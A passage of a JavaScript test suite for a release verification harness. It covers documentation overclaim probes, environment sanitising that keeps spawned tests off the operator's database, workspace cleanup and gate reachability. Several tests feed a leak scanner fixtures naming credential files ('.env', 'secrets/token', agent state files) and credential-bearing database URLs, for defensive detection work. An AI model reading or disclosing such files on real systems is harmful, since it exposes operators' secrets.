// ---------------------------------------------------------------------------

test("the real dependency gate exits 0 at or above the recorded baseline", () => {
  // Without this, the nested `node --test` inherits this runner's context and
  // reports in the binary format — the same trap the harness itself avoids.
  const env = { ...process.env };
  delete env["NODE_TEST_CONTEXT"];
  const result = spawnSync("npm", ["run", "--silent", "test:dependency-gate"], {
    cwd: REPOSITORY_ROOT, encoding: "utf8", shell: false, env, maxBuffer: 32 * 1024 * 1024,
  });
  assert.equal(result.status, 0, "the required gate must pass at this commit");
  const counted = countedTests(`${result.stdout}${result.stderr}`);
  assert.ok(counted !== null, "the gate must report a test count");
  assert.ok(counted >= DEPENDENCY_GATE_BASELINE,
    `observed ${counted} tests, baseline ${DEPENDENCY_GATE_BASELINE}`);
});

// ---------------------------------------------------------------------------
// The documentation probe (E7b)
// ---------------------------------------------------------------------------

test("a sentence forbidding the claim is not the claim", () => {
  const honest = "This document therefore records it, and no document may describe "
    + "the preflight as unconditionally enforced.";
  assert.deepEqual(overclaimingSentences(honest), []);
  const dishonest = "The Goal 5a0 preflight is unconditionally enforced on every path.";
  assert.equal(overclaimingSentences(dishonest).length, 1);
  assert.equal(overclaimingSentences("The bypass cannot be bypassed.").length, 1);
});

test("the published migration-and-recovery page satisfies the probe as written", () => {
  const { statusOf, run } = fullRun();
  assert.equal(statusOf("documentation-probe").status, "verified");
  assert.equal(automatedEvidence(run.records).E7b, "Verified");
});

test("no OSS-B0 document published on this tree overclaims enforcement", () => {
  const offenders = [];
  for (const path of OSS_B0_DOCUMENTS) {
    const absolute = join(REPOSITORY_ROOT, path);
    if (!existsSync(absolute)) continue;
    for (const sentence of overclaimingSentences(readFileSync(absolute, "utf8"))) {
      offenders.push(`${path}: ${sentence.trim()}`);
    }
  }
  assert.deepEqual(offenders, []);
});

test("a list of claims a document refuses to make is read as the refusal it is", () => {
  // The negation is in the lead-in, and the items are the claims being refused.
  const refusals = [
    "Still **not** claimed, and why:",
    "",
    "- Restore. Existing mode requires a bundle; it never applies one.",
    "- Any claim that the preflight is unconditionally enforced. See",
    "  [The guard is procedural, not technical](#the-guard-is-procedural-not-technical).",
    "",
    "## Rehearsal",
  ].join("\n");
  assert.deepEqual(overclaimingSentences(refusals), []);

  const publicGuide = readFileSync(
    join(REPOSITORY_ROOT, "docs/release/migration-and-recovery.md"), "utf8");
  assert.deepEqual(overclaimingSentences(publicGuide), []);
});

test("the refused-list exemption ends where the list does", () => {
  // A prohibiting lead-in governs its own items and nothing beyond them, so a
  // claim cannot be smuggled in by putting a refusal above it.
  const afterTheList = [
    "Still not claimed, and why:",
    "",
    "- Any claim that the preflight is unconditionally enforced.",
    "",
    "The preflight cannot be bypassed.",
  ].join("\n");
  assert.deepEqual(overclaimingSentences(afterTheList).map((line) => line.trim()),
    ["The preflight cannot be bypassed."]);

  // A list whose lead-in claims nothing of the sort is scanned item by item.
  const guarantees = ["Enforcement guarantees:", "", "- The preflight cannot be bypassed."].join("\n");
  assert.deepEqual(overclaimingSentences(guarantees).map((line) => line.trim()),
    ["- The preflight cannot be bypassed."]);

  // The lead-in has to actually introduce the list: a prohibition that ends a
  // paragraph governs that paragraph, not whatever follows it.
  const unattached = ["This document must not claim enforcement.", "", "- The preflight cannot be bypassed."].join("\n");
  assert.deepEqual(overclaimingSentences(unattached).map((line) => line.trim()),
    ["- The preflight cannot be bypassed."]);

  // And a claim in the lead-in itself is still a claim.
  const dishonestLeadIn = ["The preflight cannot be bypassed, for these reasons:", "", "- It is composed."].join("\n");
  assert.deepEqual(overclaimingSentences(dishonestLeadIn).map((line) => line.trim()),
    ["The preflight cannot be bypassed, for these reasons:"]);
});

test("the probe refuses a published page that hides the bypassing commands", () => {
  const { statusOf, run } = fullRun({
    documents: {
      "docs/release/migration-and-recovery.md":
        "Use `npm run db:migrate:release`; it composes `npm run db:migrate-goal-execution`.",
    },
  });
  assert.equal(statusOf("documentation-probe").status, "refused");
  assert.equal(statusOf("documentation-probe").reason, "assertion-failed");
  assert.equal(run.result, "refused");
  assert.equal(automatedEvidence(run.records).E7b, undefined);
});

test("the probe refuses a published page that overclaims, and reports no document text", () => {
  const claim = "The preflight is unconditionally enforced; migrations cannot be bypassed.";
  const { statusOf, run } = fullRun({
    documents: {
      "docs/release/migration-and-recovery.md": [
        "`npm run db:migrate:release` and `npm run db:migrate-goal-execution` run the preflight.",
        "`npm run db:migrate` and `prisma migrate deploy` bypass it.",
        claim,
      ].join("\n"),
    },
  });
  assert.equal(statusOf("documentation-probe").reason, "assertion-failed");
  assert.ok(!JSON.stringify(reportOf(run)).includes("unconditionally"),
    "the report names the class, never the offending sentence");
});

test("E7b is pending, not green, while Step 7's page is unwritten", () => {
  const documents = documentsFor();
  delete documents["docs/release/migration-and-recovery.md"];
  const stub = stubRunner({ root: cleanTree() });
  const run = runAcceptance({
    run: stub.run,
    environment: { nodeSupported: true, redLines: true },
    documents,
    target: { ok: true },
    label: "oss-b0-verify-fixture",
  });
  const probe = run.records.find((entry) => entry.check === "documentation-probe");
  assert.equal(probe.status, "pending");
  assert.equal(probe.dependency, "step-7-release-documents");
  assert.equal(automatedEvidence(run.records).E7b, undefined);
});

test("an absent scratch database is pending; a present non-disposable one is refused", () => {
  const absent = fullRun({ target: disposableTarget({ url: undefined, allowScratch: "1" }) });
  assert.equal(absent.statusOf("database-fixtures").status, "pending");
  assert.equal(absent.run.result, "pending");
  const wrong = fullRun({
    target: disposableTarget({ url: connection({ port: "5432", database: "x" }), allowScratch: "1" }),
  });
  assert.equal(wrong.statusOf("database-fixtures").status, "refused");
  assert.equal(wrong.run.result, "refused");
});

// ---------------------------------------------------------------------------
// The private-path boundary
// ---------------------------------------------------------------------------

test("a command may print its own checkout path; it may not print operator state", () => {
  const repositoryPath = homePath("checkouts", "agentos");
  const ownPath = `at ${repositoryPath}/packages/api/src/app.test.ts:104:46`;
  assert.deepEqual(forbiddenDisclosures(ownPath, [], { repositoryPath }), [],
    "node --test prints an absolute path per test file; refusing on that refuses every run");
  assert.deepEqual(forbiddenDisclosures(ownPath, []), ["private-path-in-output"],
    "with no exemption the same text is a disclosure");
  for (const leak of [
    homePath(".agentos", "state.json"),
    homePath("Library", "LaunchAgents", "com.agentos.plist"),
    foreignHomePath("checkouts", "agentos", ".env"),
    linuxHomePath("secrets", "token"),
  ]) {
    assert.deepEqual(forbiddenDisclosures(`wrote ${leak}`, [], { repositoryPath }),
      ["private-path-in-output"], `${leak} is outside the checkout and must refuse`);
  }
});

test("a real suite's absolute test-file paths do not refuse, an injected home path does", () => {
  const root = cleanTree();
  const suiteOutput = `✔ ok (1ms)\n    at ${root}/packages/api/src/app.test.ts:1:1\n`;
  const passing = fullRun({
    root,
    repositoryPath: root,
    inject: { "npm test -w @anneal/api": { status: 0, stdout: suiteOutput, stderr: "" } },
  });
  assert.equal(passing.statusOf("api-tests").status, "verified");

  const leaking = fullRun({
    root,
    repositoryPath: root,
    inject: {
      "npm test -w @anneal/api": {
        status: 0, stdout: `read ${homePath(".agentos", "config.json")}\n`, stderr: "",
      },
    },
  });
  assert.equal(leaking.statusOf("api-tests").status, "refused");
  assert.equal(leaking.statusOf("api-tests").reason, "private-path-in-output");
  assert.ok(!JSON.stringify(reportOf(leaking.run)).includes(".agentos"));
});

test("the report self-check refuses any absolute path, including the run's own checkout", () => {
  const { run } = fullRun();
  assert.deepEqual(reportDisclosures(reportOf(run)), []);
  assert.deepEqual(reportDisclosures({ note: homePath("checkouts", "agentos") }), ["private-path-in-output"]);
  assert.deepEqual(
    reportDisclosures({ note: connection({ scheme: "postgres", user: "u", secret: "p", database: "db" }) }),
    ["credential-url-in-output"]);
  assert.ok(REASON_CLASSES.includes("report-redaction-failed"));
});

test("repeated scans of the same text are stable", () => {
  const text = `${TOKEN} and ${connection({ scheme: "postgres", user: "u", secret: "p", host: "h", port: "", database: "db" })}`;
  const first = forbiddenDisclosures(text, []);
  assert.deepEqual(forbiddenDisclosures(text, []), first, "a global pattern must not carry lastIndex between calls");
  assert.deepEqual(first, ["credential-url-in-output", "credential-in-output"]);
});

// ---------------------------------------------------------------------------
// The child environment
// ---------------------------------------------------------------------------

test("the harness names its own schema and refuses one it was handed", () => {
  const label = "oss-b0-verify-deadbeef";
  const withoutSchema = disposableTarget({ url: connection(), allowScratch: "1", label });
  assert.equal(withoutSchema.ok, true);
  assert.ok(withoutSchema.url.includes(`schema=${label}`));

  const mine = disposableTarget({ url: connection({ query: `?schema=${label}_api` }), allowScratch: "1", label });
  assert.equal(mine.ok, true);

  const theirs = disposableTarget({ url: connection({ query: "?schema=agentos_test_9f2c" }), allowScratch: "1", label });
  assert.deepEqual(theirs, { ok: false, reason: "ownership-label-mismatch" },
    "the suites drop the schema they are pointed at, so a schema this run did not name is refused");
});

test("no spawned command can resolve the operator's database", () => {
  const label = "oss-b0-verify-deadbeef";
  const operatorEnvironment = {
    TEST_DATABASE_URL: connection({ port: "5432", database: "agentos", query: "?schema=agentos_test" }),
    AGENTOS_ALLOW_SCRATCH_DATABASES: "1",
    NODE_TEST_CONTEXT: "child-v8",
    PATH: "/usr/bin",
  };
  const refused = disposableTarget({ ...operatorEnvironment, url: operatorEnvironment.TEST_DATABASE_URL,
    allowScratch: "1", label });
  assert.equal(refused.reason, "target-not-disposable");

  const child = childEnvironment({ environment: operatorEnvironment, target: refused, label, workspace: workspaceFixture });
  assert.equal(child.TEST_DATABASE_URL, unreachableTarget(label));
  assert.equal(child.DATABASE_URL, unreachableTarget(label),
    "Prisma reads DATABASE_URL, so an inherited one is exactly the alias that must not survive");
  assert.equal(child.TEST_DATABASE_MAINTENANCE_URL, maintenanceUrl(unreachableTarget(label)));
  assert.equal(child.AGENTOS_ALLOW_SCRATCH_DATABASES, undefined);
  assert.equal(child.NODE_TEST_CONTEXT, undefined, "a nested node --test must still print its counts");
  assert.equal(child.OSS_B0_VERIFY_LABEL, label);
  assert.equal(child.PATH, "/usr/bin");

  // The fallback satisfies the house harness's own rule — a non-`public` schema —
  // so nothing throws at import time, and it refuses on connect.
  const parsed = new URL(unreachableTarget(label));
  assert.equal(parsed.hostname, "localhost");
  assert.equal(parsed.port, "1");
  assert.equal(parsed.searchParams.get("schema"), label);
});

test("an accepted target reaches the children with the opt-in the suites require", () => {
  const label = "oss-b0-verify-deadbeef";
  const target = disposableTarget({ url: connection(), allowScratch: "1", label });
  const child = childEnvironment({ environment: { PATH: "/usr/bin" }, target, label, workspace: workspaceFixture });
  assert.equal(child.TEST_DATABASE_URL, target.url);
  assert.equal(child.DATABASE_URL, target.url);
  assert.equal(child.AGENTOS_ALLOW_SCRATCH_DATABASES, "1");
  // Derived from the classified target, never accepted from the caller: the pool
  // in testdb.ts wants the same server and role with a different database.
  const maintenance = new URL(child.TEST_DATABASE_MAINTENANCE_URL);
  const source = new URL(target.url);
  assert.equal(maintenance.host, source.host);
  assert.equal(maintenance.username, source.username);
  assert.notEqual(maintenance.pathname, source.pathname);
  assert.equal(child.RUNNER_WORKSPACE_ROOT, workspaceFixture.workspaceRoot);
  assert.equal(child.CONTROL_PLANE_STATE_DIR, workspaceFixture.controlPlaneStateDir);
});

test("cleanup can only ever name this run's own schema", () => {
  const label = "oss-b0-verify-deadbeef";
  const target = disposableTarget({ url: connection(), allowScratch: "1", label });
  const schema = targetSchema(target.url);
  assert.equal(schema, label);
  assert.deepEqual(removableResources([schema], label), { ok: true, removable: [label] });

  // The operator's own test schema, had it ever reached this point.
  const foreign = removableResources(["agentos_test_9f2c1d"], label);
  assert.equal(foreign.ok, false);
  assert.equal(foreign.reason, "ownership-label-mismatch");
  assert.deepEqual(foreign.removable, []);
  assert.equal(targetSchema("not a url"), null);
  assert.equal(targetSchema(connection()), null, "a target with no schema names nothing to drop");
});

test("the Node range check accepts exactly the published range", () => {
  assert.equal(SUPPORTED_NODE_RANGE, "^20.19.0 || ^22.13.0 || >=24");
  for (const version of ["v20.19.0", "20.19.4", "v20.20.0", "v22.13.0", "v22.20.1", "v24.0.0", "v26.5.0"]) {
    assert.equal(nodeSatisfiesRange(version), true, `${version} is inside the range`);
  }
  for (const version of ["v20.18.9", "v20.0.0", "v21.7.3", "v22.12.9", "v23.9.0", "v18.20.4", "not-a-version"]) {
    assert.equal(nodeSatisfiesRange(version), false, `${version} is outside the range`);
  }
  const root = JSON.parse(readFileSync(join(REPOSITORY_ROOT, "package.json"), "utf8"));
  assert.equal(root.engines.node, SUPPORTED_NODE_RANGE, "the harness must match the public package engine");
});

// ---------------------------------------------------------------------------
// The release-migration probe (E7, E7a)
// ---------------------------------------------------------------------------

test("the release-migration probe matches what the rehearsal actually emits", () => {
  // The lines a passing rehearsal printed on this branch, verbatim. It runs on
  // its own disposable Compose project, volume, port and worktree, so this
  // fixture is the closest thing to that evidence the suite can hold without a
  // Docker daemon.
  const observed = [
    "rehearse-release-migrate fresh-migration-runs-under-the-lock=pass",
    "rehearse-release-migrate result=pass",
    "rehearse-release-migrate fresh-migration=exercised-end-to-end-under-the-maintenance-lock applied=19",
    "rehearse-release-migrate existing-mode=blocked reason=oss-d-backup-attestation-unmerged lock-state=validated",
  ].join("\n");
  const probe = ACCEPTANCE_CHECKS.find((check) => check.id === "release-migration");
  assert.equal(probe.assert({ outputs: [observed] }), null);
  assert.deepEqual(forbiddenDisclosures(observed, []), [],
    "the rehearsal's own output must carry no disclosure, with no exemption at all");

  // A rehearsal that only reached its preparatory verdict is not a pass.
  assert.deepEqual(probe.assert({ outputs: ["rehearse-release-migrate result=pass-preparatory"] }),
    { reason: "assertion-failed" });
  assert.deepEqual(probe.assert({ outputs: ["rehearse-release-migrate result=fail cases=2"] }),
    { reason: "assertion-failed" });
  assert.deepEqual(probe.assert({ outputs: [""] }), { reason: "assertion-failed" });
});

test("the operator-only rehearsal is an explicit release-candidate dependency", () => {
  const check = ACCEPTANCE_CHECKS.find((entry) => entry.id === "release-migration");
  assert.equal(check.stage, "release-candidate");
  assert.equal(check.dependencyPath, "deploy/rehearse-postgres-release-migrate.sh");
  assert.deepEqual(check.commands, [["zsh", "deploy/rehearse-postgres-release-migrate.sh"]]);
  assert.equal(existsSync(join(REPOSITORY_ROOT, check.dependencyPath)), false,
    "the public tree must not silently acquire the operator-only rehearsal");
});

test("the setup probe reads the script's one status line, anchored", () => {
  const probe = ACCEPTANCE_CHECKS.find((check) => check.id === "setup-local");
  assert.equal(probe.assert({ outputs: ["setup:local dry-run would-write\n"] }), null);
  assert.equal(probe.assert({ outputs: ["setup:local dry-run\n"] }).reason, "assertion-failed",
    "a class has to follow the mode");
  assert.equal(probe.assert({ outputs: ["a run of setup:local dry-run happened\n"] }).reason, "assertion-failed");
  assert.equal(probe.assert({ outputs: ["setup:local would-write\n"] }).reason, "assertion-failed",
    "a real write is not a dry run");
});

// ---------------------------------------------------------------------------
// The testing red lines. Established by the harness, not by whoever typed the
// command: every assertion here is about what the *harness* guarantees when the
// caller's environment is hostile or simply unprepared.
// ---------------------------------------------------------------------------

const HARNESS = join(REPOSITORY_ROOT, "scripts", "verify-oss-b0.mjs");

/** The harness as a subprocess, with an environment this test controls entirely. */
const runCli = (args, environment = {}) => spawnSync(process.execPath, [HARNESS, ...args], {
  cwd: REPOSITORY_ROOT,
  encoding: "utf8",
  env: { PATH: process.env.PATH, HOME: process.env.HOME, ...environment },
  shell: false,
  timeout: 120_000,
});

test("the harness creates its own workspace root and removes only that one", () => {
  const label = ownershipLabel("aa11bb22");
  const workspace = openWorkspace({ label });
  try {
    assert.equal(workspace.ok, true);
    assert.ok(existsSync(workspace.workspaceRoot), "RUNNER_WORKSPACE_ROOT must exist before any command runs");
    assert.ok(existsSync(workspace.controlPlaneStateDir),
      "the control-plane state directory defaults into the operator's home, so this run needs its own");
    assert.ok(workspace.root.includes(label), "the workspace carries this run's ownership label");
  } finally {
    assert.deepEqual(closeWorkspace(workspace, label), { ok: true });
  }
  assert.ok(!existsSync(workspace.root), "a completed run leaves no workspace behind");
});

test("a workspace this run does not own is never removed", () => {
  const label = ownershipLabel("cc33dd44");
  const foreign = mkdtempSync(join(tmpdir(), "operator-workspace-"));
  try {
    const refused = closeWorkspace({ ok: true, root: foreign }, label);
    assert.equal(refused.ok, false);
    assert.equal(refused.reason, "ownership-label-mismatch");
    assert.ok(existsSync(foreign), "the directory must still be there");
    // And a root outside the temporary tree is refused even when it carries the
    // label, because "under tmpdir" is the other half of the rule.
    const outside = closeWorkspace({ ok: true, root: join(REPOSITORY_ROOT, "packages") }, label);
    assert.equal(outside.ok, false);
  } finally {
    spawnSync("rm", ["-rf", foreign], { shell: false });
  }
});

test("no command can be built without the red lines in place", () => {
  const label = ownershipLabel("ee55ff66");
  assert.throws(
    () => childEnvironment({ environment: {}, target: { ok: false }, label, workspace: { ok: false, reason: "test-redline-unavailable" } }),
    /test-redline-unavailable/u,
  );
  // A caller-supplied workspace root is replaced rather than trusted: the red
  // line has to hold whether or not they remembered to point it at a temp dir.
  const child = childEnvironment({
    environment: { RUNNER_WORKSPACE_ROOT: homePath(".agentos", "runs"), CONTROL_PLANE_STATE_DIR: homePath(".agentos", "control-plane") },
    target: { ok: false, reason: "dependency-unavailable" },
    label,
    workspace: workspaceFixture,
  });
  assert.equal(child.RUNNER_WORKSPACE_ROOT, workspaceFixture.workspaceRoot);
  assert.equal(child.CONTROL_PLANE_STATE_DIR, workspaceFixture.controlPlaneStateDir);
});

test("every inherited database alias is dropped or rewritten to this run's target", () => {
  const label = ownershipLabel("1122aabb");
  // One value per alias, all of them pointing at the operator's installation.
  const polluted = {};
  for (const alias of DATABASE_ALIASES) polluted[alias] = connection({ port: "5432", database: "agentos" });
  polluted.PGPORT = "5432";
  polluted.PGHOST = "localhost";
  polluted.PGDATABASE = "agentos";
  polluted.PATH = "/usr/bin";

  const child = childEnvironment({
    environment: polluted,
    target: { ok: false, reason: "dependency-unavailable" },
    label,
    workspace: workspaceFixture,
  });
  const rewritten = new Set(["DATABASE_URL", "TEST_DATABASE_URL", "TEST_DATABASE_MAINTENANCE_URL"]);
  for (const alias of DATABASE_ALIASES) {
    if (rewritten.has(alias)) {
      assert.notEqual(child[alias], polluted[alias], `${alias} must not survive inheritance`);
      assert.ok(new URL(child[alias]).port !== "5432", `${alias} must not name the operator's port`);
      continue;
    }
    assert.equal(child[alias], undefined, `${alias} must be removed`);
  }
  assert.equal(child.PATH, "/usr/bin", "only database aliases are touched");

  const policy = environmentPolicy({ environment: polluted, target: { ok: false }, label, workspace: workspaceFixture });
  assert.deepEqual(policy.databaseAliasesRetained, []);
  assert.equal(policy.workspaceRoot, "harness-owned-temporary");
  // The class is a measurement: a workspace the harness did not own would say so.
  assert.equal(
    environmentPolicy({
      environment: polluted,
      target: { ok: false },
      label,
      workspace: { ...workspaceFixture, workspaceRoot: homePath(".agentos", "runs") },
    }).workspaceRoot,
    "caller-supplied",
  );
  assert.equal(policy.databaseTarget, "unreachable-loopback");
  assert.equal(policy.scratchOptIn, "absent");
  // The policy itself is classes and this file's own constant names — no value
  // from the caller's environment appears in it.
  const serialised = JSON.stringify(policy);
  assert.ok(!serialised.includes("5432"));
  assert.ok(!serialised.includes("agentos:"));
});

test("the red lines are a prerequisite edge, so no command can be scheduled around them", () => {
  const redLines = ACCEPTANCE_CHECKS.find((check) => check.id === "test-red-lines");
  assert.deepEqual(redLines.commands, []);
  for (const check of ACCEPTANCE_CHECKS) {
    if (check.commands.length === 0) continue;
    const reachable = new Set();
    const walk = (id) => {
      if (reachable.has(id)) return;
      reachable.add(id);
      for (const need of ACCEPTANCE_CHECKS.find((entry) => entry.id === id).needs) walk(need);
    };
    walk(check.id);
    assert.ok(reachable.has("test-red-lines"), `${check.id} spawns commands without depending on the red lines`);
  }

  const { stub, run, statusOf } = fullRun({
    environment: { nodeSupported: true, redLines: false },
  });
  assert.equal(statusOf("test-red-lines").status, "refused");
  assert.equal(statusOf("test-red-lines").reason, "test-redline-unavailable");
  assert.deepEqual(stub.order, [], "not one command may run without the red lines");
  assert.equal(run.result, "refused");
  assert.deepEqual(automatedEvidence(run.records), {});
});

test("[cli] a harness that cannot establish the red lines runs nothing", () => {
  const result = runCli([], { TMPDIR: join(REPOSITORY_ROOT, "does-not-exist-oss-b0-redline") });
  assert.equal(result.status, 1);
  assert.match(result.stderr, /^verify-oss-b0 result=refused reason=test-redline-unavailable$/mu);
  assert.equal(result.stdout, "", "no check may report before the red lines hold");
});

test("[cli] a polluted environment reaches no child, and the policy echoes no value", () => {
  const result = runCli(["--explain-environment"], {
    DATABASE_URL: connection({ port: "5432", database: "agentos" }),
    TEST_DATABASE_MAINTENANCE_URL: connection({ port: "5432", database: "postgres" }),
    TEST_DATABASE_URL: connection({ port: "5432", database: "agentos", query: "?schema=public" }),
    PGHOST: "localhost",
    PGPORT: "5432",
    RUNNER_WORKSPACE_ROOT: homePath(".agentos", "runs"),
  });
  assert.equal(result.status, 0);
  const policy = JSON.parse(result.stdout);
  assert.equal(policy.schemaVersion, REPORT_SCHEMA_VERSION);
  assert.deepEqual(policy.databaseAliasesRetained, []);
  assert.ok(policy.databaseAliasesDropped.includes("PGHOST"));
  assert.ok(policy.databaseAliasesDropped.includes("PGPORT"));
  assert.equal(policy.databaseTarget, "unreachable-loopback",
    "a 5432 target is not disposable, so every child gets the loopback that refuses on connect");
  // Measured, not asserted: the caller pointed RUNNER_WORKSPACE_ROOT at the
  // operator's own `~/.agentos/runs`, and the class says that value did not
  // survive into the child.
  assert.equal(policy.workspaceRoot, "harness-owned-temporary");
  assert.equal(policy.controlPlaneStateDir, "harness-owned-temporary");
  for (const shape of ["5432", "agentos:", "/Users/", "/home/", "oss-b0-verify-"]) {
    assert.ok(!result.stdout.includes(shape), `the policy must not carry ${shape}`);
  }
  assert.match(result.stderr, /cleanup=removed resource=own-workspace/u);
});

// ---------------------------------------------------------------------------
// Reachability. A gate that no merged state can satisfy is not a gate, so these
// prove that every check has a path to `verified` and that the whole graph can
// reach exit 0 — and, separately, that the paths which are *not* closed today
// report the honest reason rather than a permanent placeholder.
// ---------------------------------------------------------------------------

/** Every artefact the release-candidate stage waits on, as a merged tree would
 *  have them: Step 9's checker and a ledger with content in it. */
const closedDependencies = () => ({
  "scripts/verify-oss-b0-review.mjs": "#!/usr/bin/env node\n// Step 9's structure checker.\n",
  "docs/reviews/2026-08-19-oss-b0-v0.1.0-independent-review.md":
    "# OSS-B0 v0.1.0 independent review\n\n## Security\n## Onboarding\n## Feasibility\n\nNo OPEN must-fix.\n",
});

test("no check is unsatisfiable by construction", () => {
  for (const check of ACCEPTANCE_CHECKS) {
    if (check.dependency === undefined) continue;
    const hasPaths = (check.dependencyPaths ?? (check.dependencyPath === undefined ? [] : [1])).length > 0;
    const hasAssertion = typeof check.assert === "function";
    assert.ok(hasPaths || hasAssertion,
      `${check.id} declares a dependency with no artefact and no assertion that could ever close it`);
  }
  // And the declared paths are real repository paths, not names nobody will
  // create: each is either present on this tree or owned by a named later step.
  const declared = ACCEPTANCE_CHECKS.flatMap((check) => check.dependencyPaths ?? (check.dependencyPath === undefined ? [] : [check.dependencyPath]));
  for (const path of declared) {
    assert.match(path, /^(docs|scripts|packages|apps|deploy)\//u, `${path} is not a repository path`);
  }
  assert.deepEqual(STAGES, ["automated", "release-candidate"]);
});

test("with every declared dependency closed and every command green, the whole graph verifies", () => {
  const { run, statusOf, stub } = fullRun({
    stage: "release-candidate",
    documents: closedDependencies(),
  });

  for (const record of run.records) {
    assert.equal(record.status, "verified", `${record.check} is ${record.status} (${record.reason ?? "no reason"})`);
  }
  assert.equal(run.result, "verified", "the release-candidate gate must be reachable");
  // Which is the exit code the release decision reads.
  assert.equal(run.result === "verified" ? 0 : 1, 0);

  // The rows that could never advance before: E8 from the merged OSS-D verdict,
  // E12 from the fixture-parity pair, E14 from the checker's exit status.
  const marks = automatedEvidence(run.records);
  for (const row of ["E3", "E4", "E5", "E6", "E7", "E7a", "E7b", "E8", "E9", "E10", "E11", "E12", "E14", "E15", "E15a"]) {
    assert.equal(marks[row], "Verified", `${row} must be reachable`);
  }
  assert.equal(marks.E16, undefined, "E16 is computed at Step 10 and never by this harness");
  // The review checker is *run*, not counted.
  assert.ok(stub.order.includes("node scripts/verify-oss-b0-review.mjs docs/reviews/2026-08-19-oss-b0-v0.1.0-independent-review.md"));

  const report = reportOf(run);
  assert.deepEqual(reportSchemaViolations(report), []);
  assert.deepEqual(reportDisclosures(report), []);
});

test("the automated stage closes while the release-candidate rows still wait", () => {
  const automated = fullRun();
  assert.equal(automated.statusOf("independent-review").status, "pending");
  // Not a skip and not green; simply not this gate's.
  assert.equal(automated.statusOf("independent-review").stage, "release-candidate");
  assert.equal(automated.statusOf("independent-review").reason, "dependency-unavailable");
  // The operator-only rehearsal remains explicitly outside the automated gate.
  assert.equal(automated.statusOf("release-migration-existing-mode").stage, "release-candidate");
  assert.equal(automated.statusOf("release-migration-existing-mode").status, "verified");
  assert.equal(automated.run.result, "verified", "the gate Step 9 enters on must be closable by this candidate");

  // The same records, judged by the release-candidate gate, are pending.
  const candidate = fullRun({ stage: "release-candidate" });
  assert.equal(candidate.run.result, "pending");
});

test("a refusal in a release-candidate check is still a refusal in the automated stage", () => {
  const { run, statusOf } = fullRun({
    documents: closedDependencies(),
    inject: { "node scripts/verify-oss-b0-review.mjs docs/reviews/2026-08-19-oss-b0-v0.1.0-independent-review.md": { status: 1, stdout: "must-fix OPEN\n", stderr: "" } },
  });
  assert.equal(statusOf("independent-review").status, "refused");
  assert.equal(statusOf("independent-review").reason, "command-exit-nonzero");
  assert.equal(run.result, "refused", "stage scoping excuses a pending, never a refusal");
});

test("E8 follows the rehearsal's own existing-mode verdict", () => {
  // The verdict the merged rehearsal prints today. Step 9 finding O-1: the
  // harness accepted only two older lines, so the script's end-to-end success
  // was read as an assertion failure and E8 could never reach Verified.
  const exercised = fullRun();
  assert.equal(exercised.statusOf("release-migration-existing-mode").status, "verified");
  assert.equal(automatedEvidence(exercised.run.records).E8, "Verified");

  // `applied=` is informational — the count is a literal in the script, not a
  // measurement of the run — so the prefix decides and the count may move or go.
  for (const existingMode of [
    "existing-mode=exercised-end-to-end-against-an-attested-bundle",
    "existing-mode=exercised-end-to-end-against-an-attested-bundle applied=42",
  ]) {
    const variant = fullRun({ rehearsal: { existingMode } });
    assert.equal(variant.statusOf("release-migration-existing-mode").status, "verified");
  }

  // A rehearsal that printed no existing-mode line at all proves nothing about
  // existing mode, and the two lines this check used to accept are gone from the
  // script — neither may be revived by the harness accepting them.
  for (const existingMode of [
    null,
    "existing-mode=pass lock-state=validated",
    "existing-mode=blocked reason=oss-d-backup-attestation-unmerged lock-state=validated",
    "existing-mode=exercised-end-to-end-against-an-attested-bundle applied=many",
    "existing-mode-reads-the-lock-state=pass",
  ]) {
    const rejected = fullRun({ rehearsal: { existingMode } });
    assert.equal(rejected.statusOf("release-migration-existing-mode").status, "refused",
      `${existingMode} must not satisfy E8`);
    assert.equal(rejected.statusOf("release-migration-existing-mode").reason, "assertion-failed");
  }

  // The summary lines are printed after the rehearsal's own failure gate, so a
  // mode line without the passing verdict is not evidence that the mode passed.
  // Read the conjunction directly, because in a whole run the missing verdict
  // stops the rehearsal check first and E8 never gets to judge anything:
  const e8 = ACCEPTANCE_CHECKS.find((check) => check.id === "release-migration-existing-mode");
  assert.deepEqual(
    e8.assert({ outputs: ["rehearse-release-migrate existing-mode=exercised-end-to-end-against-an-attested-bundle applied=19\n"] }),
    { reason: "assertion-failed" },
    "the mode line alone says which mode ran, not that the rehearsal passed",
  );
  const unproven = fullRun({ rehearsal: { result: null } });
  assert.equal(unproven.statusOf("release-migration").status, "refused");
  assert.equal(unproven.statusOf("release-migration-existing-mode").status, "blocked");
  assert.equal(unproven.statusOf("release-migration-existing-mode").reason, "prerequisite-refused");
  assert.equal(automatedEvidence(unproven.run.records).E8, undefined);

});

test("E10 stays Pending when the API database fixtures did not run", () => {
  const { run, statusOf } = fullRun({ target: disposableTarget({ url: undefined, allowScratch: "1" }) });
  assert.equal(statusOf("api-tests").status, "verified", "the unit suite passed");
  assert.equal(statusOf("database-fixtures").status, "pending");
  const marks = automatedEvidence(run.records);
  assert.equal(marks.E6, "Verified");
  assert.equal(marks.E10, undefined,
    "E10's evidence source is the API *DB* tests; unit coverage may not stand in for it");
  assert.equal(marks.E9, undefined);
  // And the row the plan assigns to the DB check is the row this check carries.
  const fixtures = ACCEPTANCE_CHECKS.find((check) => check.id === "database-fixtures");
  assert.deepEqual(fixtures.evidence, ["E9", "E10"]);
  assert.ok(fixtures.commands.some((argv) => argv.join(" ") === "npm run test:db -w @anneal/api"));
  assert.ok(!ACCEPTANCE_CHECKS.find((check) => check.id === "api-tests").evidence.includes("E10"));
});

test("an empty review ledger is an absent one, and a present path is never the proof", () => {
  const empty = fullRun({
    stage: "release-candidate",
    documents: { ...closedDependencies(), "docs/reviews/2026-08-19-oss-b0-v0.1.0-independent-review.md": "   \n" },
  });
  assert.equal(empty.statusOf("independent-review").status, "pending");
  assert.equal(empty.statusOf("independent-review").reason, "dependency-unavailable");
  assert.equal(automatedEvidence(empty.run.records).E14, undefined);
  assert.deepEqual(empty.stub.order.filter((command) => command.includes("verify-oss-b0-review")), [],
    "an absent artefact is not run");

  // The checker missing while the ledger exists is equally pending: E14 needs the
  // structure checker's verdict, not a file at a path.
  const noChecker = fullRun({
    stage: "release-candidate",
    documents: { "docs/reviews/2026-08-19-oss-b0-v0.1.0-independent-review.md": closedDependencies()["docs/reviews/2026-08-19-oss-b0-v0.1.0-independent-review.md"] },
  });
  assert.equal(noChecker.statusOf("independent-review").status, "pending");

  const check = ACCEPTANCE_CHECKS.find((entry) => entry.id === "independent-review");
  assert.deepEqual(check.dependencyPaths, [
    "scripts/verify-oss-b0-review.mjs",
